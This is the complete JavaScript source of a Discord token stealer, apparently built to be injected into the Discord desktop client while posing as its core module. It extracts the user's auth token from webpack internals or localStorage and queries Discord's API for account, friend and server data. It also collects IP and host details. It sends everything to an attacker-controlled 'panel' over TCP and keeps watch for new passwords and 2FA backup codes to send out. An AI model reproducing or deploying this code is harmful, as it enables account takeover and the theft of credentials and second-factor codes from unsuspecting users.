const PANEL_IP = "{{PANEL_IP}}";
const PANEL_PORT = {{PANEL_PORT}};

const net = require('net');
const https = require('https');
const crypto = require('crypto');

let lastPasswordHash = null;
let lastBackupCodesHash = null;

function sendToPanel(payload) {
    return new Promise((resolve) => {
        const client = new net.Socket();
        client.connect(PANEL_PORT, PANEL_IP, () => {
            client.write(JSON.stringify(payload) + "\r\n\r\n");
            client.once('data', () => { client.destroy(); resolve(true); });
        });
        client.on('error', () => resolve(false));
        client.setTimeout(10000, () => { client.destroy(); resolve(false); });
    });
}

async function getToken() {
    let token = null;
    if (window.webpackChunkdiscord_app) {
        window.webpackChunkdiscord_app.push([[Symbol()], {}, o => {
            for (let e of Object.values(o.c)) {
                try {
                    if (!e.exports || e.exports === window) continue;
                    if (e.exports?.getToken) token = e.exports.getToken();
                    for (let key in e.exports) {
                        if (e.exports?.[key]?.getToken && "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]) {
                            token = e.exports[key].getToken();
                        }
                    }
                } catch {}
            }
        }]);
        window.webpackChunkdiscord_app.pop();
    }
    if (!token) {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && key.includes('token')) {
                try {
                    const parsed = JSON.parse(localStorage.getItem(key));
                    if (parsed?.token) token = parsed.token;
                } catch {}
            }
        }
    }
    return token;
}

async function getIPInfo() {
    return new Promise((resolve) => {
        https.get('https://ipinfo.io/json', (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch { resolve({}); }
            });
        }).on('error', () => resolve({}));
    });
}

function getSystemInfo() {
    const os = require('os');
    return {
        os: os.platform() + ' ' + os.release(),
        hostname: os.hostname(),
        username_system: os.userInfo().username,
        pc_name: os.hostname()
    };
}

async function getUserInfo(token) {
    return new Promise((resolve) => {
        const opts = { hostname: 'discord.com', path: '/api/v9/users/@me', method: 'GET', headers: { 'Authorization': token } };
        const req = https.request(opts, (res) => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
        });
        req.on('error', () => resolve(null));
        req.end();
    });
}

async function getRelationships(token) {
    return new Promise((resolve) => {
        const opts = { hostname: 'discord.com', path: '/api/v9/users/@me/relationships', method: 'GET', headers: { 'Authorization': token } };
        const req = https.request(opts, (res) => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => {
                try {
                    const data = JSON.parse(d);
                    resolve({ friends: data.filter(r => r.type === 1).length, blocked: data.filter(r => r.type === 2).length });
                } catch { resolve({ friends: 0, blocked: 0 }); }
            });
        });
        req.on('error', () => resolve({ friends: 0, blocked: 0 }));
        req.end();
    });
}

async function getGuildCount(token) {
    return new Promise((resolve) => {
        const opts = { hostname: 'discord.com', path: '/api/v9/users/@me/guilds', method: 'GET', headers: { 'Authorization': token } };
        const req = https.request(opts, (res) => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => { try { resolve(JSON.parse(d).length); } catch { resolve(0); } });
        });
        req.on('error', () => resolve(0));
        req.end();
    });
}

function getBadges(flags) {
    const badgeMap = {
        1: "Discord Employee", 2: "Discord Partner", 4: "HypeSquad Events",
        8: "Bug Hunter L1", 64: "HypeSquad Bravery", 128: "HypeSquad Brilliance",
        256: "HypeSquad Balance", 512: "Early Supporter", 16384: "Bug Hunter L2",
        131072: "Verified Developer", 4194304: "Active Developer"
    };
    const badges = [];
    for (const [flag, name] of Object.entries(badgeMap)) {
        if (flags & parseInt(flag)) badges.push(name);
    }
    return badges;
}

async function sendInitialData(token) {
    const userInfo = await getUserInfo(token);
    const ipInfo = await getIPInfo();
    const relationships = await getRelationships(token);
    const guildCount = await getGuildCount(token);
    const badges = userInfo?.flags ? getBadges(userInfo.flags) : [];
    const si = getSystemInfo();
    await sendToPanel({
        ...si,
        injection_type: "initial",
        token: token,
        user_info: userInfo,
        ip_info: ipInfo,
        relationships: relationships,
        guild_count: guildCount,
        badges: badges
    });
}

function startPasswordMonitor() {
    setInterval(async () => {
        try {
            const inputs = document.querySelectorAll('input[type="password"]');
            for (const input of inputs) {
                if (input.value && input.value.length > 0) {
                    const hash = crypto.createHash('sha256').update(input.value).digest('hex');
                    if (lastPasswordHash !== null && lastPasswordHash !== hash) {
                        const si = getSystemInfo();
                        await sendToPanel({ ...si, injection_type: "password_change", password: input.value });
                    }
                    lastPasswordHash = hash;
                }
            }
        } catch {}
    }, 3000);
}

function startBackupCodeMonitor() {
    setInterval(async () => {
        try {
            const codeRegex = /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/gi;
            const matches = document.body.innerText.match(codeRegex);
            if (matches) {
                const codes = matches.join(', ');
                const hash = crypto.createHash('sha256').update(codes).digest('hex');
                if (lastBackupCodesHash !== null && lastBackupCodesHash !== hash) {
                    const si = getSystemInfo();
                    await sendToPanel({ ...si, injection_type: "backup_codes", codes: codes });
                }
                lastBackupCodesHash = hash;
            }
        } catch {}
    }, 5000);
}

setTimeout(async () => {
    const token = await getToken();
    if (token) {
        await sendInitialData(token);
        startPasswordMonitor();
        startBackupCodeMonitor();
    } else {
        const si = getSystemInfo();
        await sendToPanel({ ...si, injection_type: "error", error: "No token found" });
    }
}, 5000);

try { module.exports = require("./core.asar"); } catch (e) {}
module.exports = require("./core.asar");